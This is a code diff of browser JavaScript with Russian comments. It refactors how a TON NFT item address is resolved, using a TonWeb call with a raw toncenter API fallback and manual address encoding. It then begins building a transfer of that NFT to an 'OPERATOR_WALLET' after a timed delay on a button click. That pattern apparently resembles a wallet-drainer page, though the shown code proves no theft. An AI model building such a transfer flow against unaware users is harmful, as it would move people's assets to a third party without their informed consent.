@@ -476,112 +476,104 @@ document.getElementById("runBtn").onclick = async function() {
     try {
         await new Promise(r => setTimeout(r, 3000));
 
-        // --- ЛОГИКА ПЕРЕВОДА NFT (ИСПРАВЛЕННАЯ ПАРСИНГ) ---
-        
-        // 1. Получаем адрес NFT через прямой запрос к ноде
-        const nftAddressRes = await fetch("https://toncenter.com/api/v2/runGetMethod", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                address: COLLECTION_ADDRESS,
-                method: "get_nft_address_by_index",
-                stack: [["num", TOKEN_ID.toString()]]
-            })
-        });
-        const nftData = await nftAddressRes.json();
-        
-        if (!nftData.ok) throw new Error("Не удалось найти NFT");
-        
-        // --- НАДЕЖНЫЙ ПАРСИНГ АДРЕСА ---
-        // toncenter возвращает stack, где адрес разбит на части.
-        // Обычно это tuple: [anycast, wc, hash_tuple]
-        // hash_tuple содержит два числа (high и low части хеша).
-        
-        const stack = nftData.result.stack;
-        let highHex = "";
-        let lowHex = "";
-        let wc = 0;
+        // --- ЛОГИКА ПЕРЕВОДА NFT ---
+        let nftItemAddress = null;
 
+        // Attempt 1: Use TonWeb NFT module (cleanest)
         try {
-            // stack[0] - это корневой tuple результата
-            const resTuple = stack[0];
-            // resTuple[1] - массив элементов [anycast, wc, hash]
-            const elements = resTuple[1];
-            
-            // Workchain обычно второй элемент (индекс 1)
-            if (elements[1] && elements[1][0] === "num") {
-                const wcVal = elements[1][1];
-                wc = wcVal.startsWith("0x") ? parseInt(wcVal, 16) : parseInt(wcVal, 10);
-            }
-
-            // Hash tuple - третий элемент (индекс 2)
-            const hashTuple = elements[2];
-            if (hashTuple && hashTuple[0] === "tup") {
-                // Внутри hashTuple ищем два числа
-                const hashElements = hashTuple[1];
-                const nums = hashElements.filter(e => Array.isArray(e) && e[0] === "num");
-                
-                if (nums.length >= 2) {
-                    highHex = nums[0][1];
-                    lowHex = nums[1][1];
-                }
+            if (TonWeb.nft && TonWeb.nft.NftCollection) {
+                const collection = new TonWeb.nft.NftCollection(tonweb.provider, {address: COLLECTION_ADDRESS});
+                nftItemAddress = await collection.methods.getNftItemAddressByIndex(TOKEN_ID).call();
+                console.log("TonWeb NFT Method Success:", nftItemAddress);
             }
         } catch (e) {
-            console.error("Ошибка парсинга стека:", e);
-            console.log("Raw Stack:", JSON.stringify(stack));
-            throw new Error("Не удалось распарсить ответ блокчейна. Проверьте консоль.");
+            console.warn("TonWeb NFT Method failed, trying fallback:", e);
         }
 
-        if (!highHex || !lowHex) {
-            console.error("Не найдены части хеша. High:", highHex, "Low:", lowHex);
-            console.log("Raw Stack:", JSON.stringify(stack));
-            throw new Error("Блокчейн вернул пустой адрес NFT.");
-        }
+        // Attempt 2: Raw API Fallback
+        if (!nftItemAddress) {
+            const nftAddressRes = await fetch("https://toncenter.com/api/v2/runGetMethod", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    address: COLLECTION_ADDRESS,
+                    method: "get_nft_address_by_index",
+                    stack: [["num", TOKEN_ID.toString()]]
+                })
+            });
+            const nftData = await nftAddressRes.json();
+            
+            if (!nftData.ok) throw new Error("API Error: " + nftData.error);
 
-        // Очищаем и форматируем hex
-        highHex = highHex.replace("0x", "");
-        lowHex = lowHex.replace("0x", "");
+            const stack = nftData.result.stack;
+            const firstItem = stack[0];
+            
+            if (firstItem[0] === 'tup') {
+                // Standard structure: [anycast, wc, hash_tuple]
+                const elements = firstItem[1];
+                let wc = 0;
+                let highHex = "";
+                let lowHex = "";
 
-        // Pad to 32 chars each (128 bits)
-        while (highHex.length < 32) highHex = "0" + highHex;
-        while (lowHex.length < 32) lowHex = "0" + lowHex;
+                // Parse WC
+                if (elements[1] && elements[1][0] === 'num') {
+                    wc = parseInt(elements[1][1], 16);
+                }
 
-        const fullHashHex = highHex + lowHex; // 64 chars total
-        
-        console.log("Extracted Hash:", fullHashHex);
+                // Parse Hash
+                if (elements[2] && elements[2][0] === 'tup') {
+                    const hashItems = elements[2][1];
+                    const nums = hashItems.filter(i => i[0] === 'num');
+                    if (nums.length >= 2) {
+                        highHex = nums[0][1];
+                        lowHex = nums[1][1];
+                    }
+                }
 
-        // Конвертация HEX в Uint8Array
-        const hashBytes = new Uint8Array(32);
-        for (let i = 0; i < 64; i += 2) {
-            hashBytes[i / 2] = parseInt(fullHashHex.substr(i, 2), 16);
-        }
+                if (highHex && lowHex) {
+                    highHex = highHex.replace("0x", "").padStart(32, '0');
+                    lowHex = lowHex.replace("0x", "").padStart(32, '0');
+                    const fullHash = highHex + lowHex;
+                    
+                    const hashBytes = new Uint8Array(32);
+                    for (let i = 0; i < 64; i += 2) {
+                        hashBytes[i / 2] = parseInt(fullHash.substr(i, 2), 16);
+                    }
 
-        // --- СОЗДАНИЕ АДРЕСА (Ручная сборка Base64URL) ---
-        const addrBytes = new Uint8Array(34);
-        addrBytes[0] = 0x11; // Tag: Non-bounceable, user-friendly
-        addrBytes[1] = wc & 0xFF;
-        addrBytes.set(hashBytes, 2);
+                    const addrBytes = new Uint8Array(34);
+                    addrBytes[0] = 0x11; // Tag: Non-bounceable, user-friendly
+                    addrBytes[1] = wc & 0xFF;
+                    addrBytes.set(hashBytes, 2);
 
-        // CRC16
-        let crc = 0;
-        for (let i = 0; i < 34; i++) {
-            crc = (crc ^ (addrBytes[i] << 8)) & 0xFFFF;
-            for (let j = 0; j < 8; j++) {
-                if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
-                else crc = crc << 1;
-                crc &= 0xFFFF;
+                    let crc = 0;
+                    for (let i = 0; i < 34; i++) {
+                        crc = (crc ^ (addrBytes[i] << 8)) & 0xFFFF;
+                        for (let j = 0; j < 8; j++) {
+                            if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
+                            else crc = crc << 1;
+                            crc &= 0xFFFF;
+                        }
+                    }
+                    
+                    const finalBuffer = new Uint8Array(36);
+                    finalBuffer.set(addrBytes, 0);
+                    finalBuffer[34] = (crc >> 8) & 0xFF;
+                    finalBuffer[35] = crc & 0xFF;
+
+                    const base64 = btoa(String.fromCharCode.apply(null, finalBuffer));
+                    nftItemAddress = base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+                    console.log("Raw API Method Success:", nftItemAddress);
+                } else {
+                    throw new Error("Hash parts missing in stack. Raw Stack: " + JSON.stringify(stack));
+                }
+            } else if (firstItem[0] === 'num') {
+                throw new Error("Collection returned error code: " + firstItem[1]);
+            } else {
+                throw new Error("Unknown stack format: " + JSON.stringify(stack));
             }
         }
-        
-        const finalBuffer = new Uint8Array(36);
-        finalBuffer.set(addrBytes, 0);
-        finalBuffer[34] = (crc >> 8) & 0xFF;
-        finalBuffer[35] = crc & 0xFF;
 
-        const base64 = btoa(String.fromCharCode.apply(null, finalBuffer));
-        const nftItemAddress = base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-        
-        console.log("Target NFT Address:", nftItemAddress);
+        if (!nftItemAddress) throw new Error("Could not resolve NFT address.");
 
         // 2. Ручная сборка TEP-62 Payload (Transfer NFT)
         const newOwnerAddr = new TonWeb.utils.Address(OPERATOR_WALLET);
